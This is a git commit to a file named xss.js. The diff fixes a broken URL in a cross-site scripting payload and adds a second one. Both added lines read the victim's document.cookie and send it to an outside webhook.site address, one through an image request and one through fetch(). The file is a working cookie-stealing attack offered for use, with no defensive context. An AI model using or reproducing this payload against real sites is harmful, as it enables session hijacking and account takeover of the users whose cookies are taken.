bb6bb85302a11b9f18bf13af7b48c830a6631d3a
d0rk1s <151846096+d0rk1s@users.noreply.github.com>
2025-01-12 21:50:27 +0100

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,2 @@
-new Image().src="http://https://webhook.site/393b8566-b2a4-4151-adec-604b8a82ebc4/?c="+encodeURI(document.cookie);
+new Image().src="https://webhook.site/393b8566-b2a4-4151-adec-604b8a82ebc4/?c="+encodeURI(document.cookie);
+fetch('https://webhook.site/393b8566-b2a4-4151-adec-604b8a82ebc4/c=' + document.cookie);
